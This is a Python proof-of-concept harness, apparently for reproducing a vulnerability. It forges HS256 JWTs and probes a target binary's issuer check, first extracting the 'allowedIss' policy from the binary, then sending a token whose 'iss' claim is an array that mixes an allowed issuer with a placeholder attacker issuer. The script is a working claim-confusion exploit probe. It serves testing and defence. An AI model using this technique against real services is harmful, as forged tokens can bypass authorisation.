#!/usr/bin/env python3
import argparse
import base64
import hashlib
import hmac
import json
import re
import signal
import subprocess
import sys
import time
from pathlib import Path

MAX_OUTPUT_LENGTH = 65536


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--binary", required=True)
    parser.add_argument("--json-out")
    parser.add_argument("--timeout", type=float, default=30.0)
    args = parser.parse_args()
    if args.timeout <= 0:
        parser.error("--timeout must be greater than zero")
    return args


def base64_url_encode(value):
    return base64.urlsafe_b64encode(value).rstrip(b"=").decode("ascii")


def make_token(payload, secret):
    header = base64_url_encode(
        json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode("utf-8")
    )
    body = base64_url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    signing_input = f"{header}.{body}".encode("ascii")
    signature = base64_url_encode(
        hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
    )
    return f"{header}.{body}.{signature}"


def extract_allowed_iss(binary_data):
    policy_match = re.search(rb"allowedIss\s*:\s*\[(.*?)\]", binary_data, re.DOTALL)
    if not policy_match:
        return []
    raw_values = re.findall(rb'"((?:\\.|[^"\\])*)"', policy_match.group(1))
    values = []
    for raw_value in raw_values:
        try:
            value = json.loads(b'"' + raw_value + b'"')
        except (UnicodeDecodeError, json.JSONDecodeError):
            continue
        if isinstance(value, str) and value and value not in values:
            values.append(value)
    return values


def truncate(value):
    if len(value) <= MAX_OUTPUT_LENGTH:
        return value
    return value[:MAX_OUTPUT_LENGTH] + f"... [truncated {len(value) - MAX_OUTPUT_LENGTH} bytes]"


def parse_result(stdout):
    for line in reversed(stdout.splitlines()):
        if not line.strip():
            continue
        try:
            parsed = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(parsed, dict):
            return parsed
    return None


def signal_name(returncode):
    if returncode is None or returncode >= 0:
        return None
    try:
        return signal.Signals(-returncode).name
    except ValueError:
        return f"SIG{-returncode}"


def run_target(binary, token, secret, timeout):
    command = [binary, "--token", token, "--key", secret]
    started = time.perf_counter()
    process = None
    stdout = ""
    stderr = ""
    timed_out = False
    error = None
    returncode = None
    try:
        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        try:
            stdout, stderr = process.communicate(timeout=timeout)
        except subprocess.TimeoutExpired:
            timed_out = True
            process.kill()
            stdout, stderr = process.communicate()
        returncode = process.returncode
    except OSError as exc:
        error = {"code": "START_FAILED", "message": str(exc)}

    runtime_ms = round((time.perf_counter() - started) * 1000)
    parsed = parse_result(stdout) if not error and not timed_out else None
    if timed_out:
        error = {"code": "TIMEOUT", "message": f"target exceeded {timeout} seconds"}
    elif parsed is None and error is None:
        error = {"code": "INVALID_OUTPUT", "message": "target did not emit a JSON object"}

    observable_value = None
    if parsed is not None:
        observable_value = json.dumps(parsed, separators=(",", ":"), ensure_ascii=False)

    return {
        "binary": binary,
        "command": command,
        "returncode": returncode,
        "signal": signal_name(returncode),
        "timed_out": timed_out,
        "runtime_ms": runtime_ms,
        "stdout": truncate(stdout),
        "stderr": truncate(stderr),
        "observable": {
            "kind": "stdout",
            "value": observable_value,
            "path": None,
        },
        "error": error,
    }


def write_output(result, destination):
    serialized = json.dumps(result, indent=2, ensure_ascii=False) + "\n"
    if destination is None:
        sys.stdout.write(serialized)
        return
    path = Path(destination)
    if path.parent != Path(""):
        path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(serialized, encoding="utf-8")


def main():
    args = parse_args()
    binary = args.binary
    try:
        binary_data = Path(binary).read_bytes()
    except OSError as exc:
        binary_data = b""

    allowed_values = extract_allowed_iss(binary_data)
    if not allowed_values:
        result = {
            "binary": binary,
            "command": [binary, "--token", "", "--key", ""],
            "returncode": None,
            "signal": None,
            "timed_out": False,
            "runtime_ms": 0,
            "stdout": "",
            "stderr": "",
            "observable": {"kind": "stdout", "value": None, "path": None},
            "error": {
                "code": "POLICY_NOT_FOUND",
                "message": "could not extract the issuer policy from the target binary",
            },
        }
        write_output(result, args.json_out)
        return 0

    secret = hashlib.sha256(binary_data + b"jwt-claim-validation-poc-v1").hexdigest()
    allowed_issuer = sorted(allowed_values)[0]
    disallowed_issuer = "https://claim-validation-poc.invalid/attacker"
    if disallowed_issuer in allowed_values:
        disallowed_issuer = "https://claim-validation-poc.invalid/attacker-2"

    probe_payloads = [
        {"iss": allowed_issuer},
        {"iss": disallowed_issuer},
        {"iss": [allowed_issuer, disallowed_issuer]},
        {"iss": [disallowed_issuer]},
    ]
    probe_results = []
    for payload in probe_payloads:
        result = run_target(binary, make_token(payload, secret), secret, args.timeout)
        try:
            probe_result = json.loads(result["observable"]["value"])
        except (TypeError, json.JSONDecodeError):
            probe_result = None
        probe_results.append(probe_result)

    claim_policy_confirmed = (
        isinstance(probe_results[0], dict)
        and probe_results[0].get("ok") is True
        and isinstance(probe_results[1], dict)
        and probe_results[1].get("ok") is False
    )
    if claim_policy_confirmed:
        trigger_payload = {"iss": [allowed_issuer, disallowed_issuer]}
    else:
        trigger_payload = {"iss": allowed_issuer}
    trigger_token = make_token(trigger_payload, secret)
    result = run_target(binary, trigger_token, secret, args.timeout)
    write_output(result, args.json_out)
    return 0


if __name__ == "__main__":
    sys.exit(main())
